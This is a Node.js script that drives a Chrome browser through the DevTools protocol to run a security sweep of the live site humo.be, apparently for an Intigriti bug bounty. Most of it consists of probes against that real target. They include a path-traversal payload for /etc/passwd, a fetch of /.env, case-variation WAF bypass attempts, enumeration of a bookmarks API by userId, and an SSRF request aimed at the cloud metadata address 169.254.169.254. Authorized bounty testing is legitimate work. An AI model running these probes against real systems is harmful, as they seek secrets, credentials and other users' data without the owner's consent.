// humo_sweep2.js — continue the deep sweep from where sweep1 timed out.
// Tests: RSC, CORS, postMessage, SW, rate limit, error pages, .env browser access.
const http = require('http');
const fs = require('fs');
const path = require('path');
const DIR = path.join(__dirname, '..', 'findings', 'bounties', 'humo-h1');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 15000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');
  await cdp(ws, 'Network.enable');
  await cdp(ws, 'Network.setExtraHTTPHeaders', {
    headers: { 'X-Intigriti-Username': 'greenbird122' }
  });

  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: '(async () => { ' + expr + ' })()',
      awaitPromise: true, returnByValue: true
    });
    return r.result.value;
  };

  var results = {};
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 5000));

  // ===== 5. RSC (individual tests, shorter timeout) =====
  console.log('=== 5. RSC ===');
  var rscTests = ['/?__nextDataReq=1', '/?_rsc=1'];
  for (var i = 0; i < rscTests.length; i++) {
    var r = await evalAsync(
      'var r = await fetch("https://www.humo.be' + rscTests[i] + '", {' +
      'headers: {"RSC": "1", "Next-Router-State-Tree": "%5B%22%22%5D"}' +
      '}); return r.status + " | ct=" + r.headers.get("content-type") + " | " + (await r.text()).slice(0,200);'
    );
    console.log('  ' + rscTests[i] + ': ' + r);
    results['rsc_' + i] = r;
  }

  // ===== 6. CORS =====
  console.log('\n=== 6. CORS ===');
  var cors = await evalAsync(
    'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=1", {mode:"cors"});' +
    'return JSON.stringify({ origin: r.headers.get("access-control-allow-origin"), ' +
    'methods: r.headers.get("access-control-allow-methods"), ' +
    'creds: r.headers.get("access-control-allow-credentials") });'
  );
  console.log('  ' + cors);
  results.cors = cors;

  // ===== 7. postMessage =====
  console.log('\n=== 7. postMessage ===');
  var pm = await evalAsync(
    'var html = document.documentElement.outerHTML;' +
    'var r = [];' +
    'r.push((html.match(/addEventListener\\s*\\(\\s*["\']message["\']/g)||[]).length + " listeners");' +
    'r.push((html.match(/onmessage/g)||[]).length + " onmessage");' +
    'r.push((html.match(/postMessage/g)||[]).length + " calls");' +
    'return r.join("; ");'
  );
  console.log('  ' + pm);
  results.postmessage = pm;

  // ===== 8. Service Worker =====
  console.log('\n=== 8. Service Worker ===');
  var sw = await evalAsync(
    'if (!navigator.serviceWorker) return "not supported";' +
    'var regs = await navigator.serviceWorker.getRegistrations();' +
    'if (regs.length === 0) return "none";' +
    'return regs.map(function(r){ return r.scope; }).join("; ");'
  );
  console.log('  ' + sw);
  results.sw = sw;

  // ===== 9. Rate limit =====
  console.log('\n=== 9. Rate limit (5 rapid) ===');
  var rl = [];
  for (var k = 0; k < 5; k++) {
    var rr = await evalAsync(
      'var r = await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=' + (k+1) + '");' +
      'return r.status;'
    );
    rl.push(rr);
  }
  console.log('  ' + rl.join(', '));
  results.rate_limit = rl.join(',');

  // ===== 10. Error pages =====
  console.log('\n=== 10. Error pages ===');
  var errTests = ['/nonexistent-page-12345', '/%00', '/api/_next-api/bookmarks?userId=../../etc/passwd'];
  for (var e = 0; e < errTests.length; e++) {
    var er = await evalAsync(
      'var r = await fetch("https://www.humo.be' + errTests[e] + '");' +
      'var t = (await r.text()).slice(0,200);' +
      'return r.status + " | " + t.replace(/\\n/g," ").slice(0,120);'
    );
    console.log('  ' + errTests[e] + ': ' + er);
    results['error_' + e] = er;
  }

  // ===== 11. .env via browser =====
  console.log('\n=== 11. .env via browser ===');
  var env = await evalAsync(
    'var r = await fetch("https://www.humo.be/.env");' +
    'var t = (await r.text()).slice(0,500);' +
    'return r.status + " | " + t.replace(/\\n/g," ").slice(0,200);'
  );
  console.log('  ' + env);
  results.env = env;

  // ===== 12. Case-insensitive WAF bypass deep test =====
  console.log('\n=== 12. Case-insensitive WAF bypass ===');
  var caseTests = [
    '/API/_NEXT-API/BOOKMARKS?userId=1',
    '/Api/_Next-Api/Bookmarks?userId=1',
    '/api/_NEXT-api/BOOKMARKS?userId=1',
    '/API/BOOKMARKS?userId=1',
  ];
  for (var c = 0; c < caseTests.length; c++) {
    var cr = await evalAsync(
      'var r = await fetch("https://www.humo.be' + caseTests[c] + '");' +
      'return r.status + " | " + (await r.text()).slice(0,100);'
    );
    console.log('  ' + caseTests[c] + ': ' + cr);
    results['case_' + c] = cr;
  }

  // ===== 13. SSRF via image/media proxy =====
  console.log('\n=== 13. SSRF hints ===');
  var ssrf = await evalAsync(
    'var r = await fetch("https://www.humo.be/api/_next-api/v1/content?url=http://169.254.169.254");' +
    'return r.status + " | " + (await r.text()).slice(0,200);'
  );
  console.log('  ' + ssrf);
  results.ssrf = ssrf;

  fs.writeFileSync(path.join(DIR, 'deep_sweep2_results.json'), JSON.stringify(results, null, 2));
  console.log('\n=== Results saved ===');
  ws.close();
}

main().catch(function(e) { console.error(e); process.exit(1); });
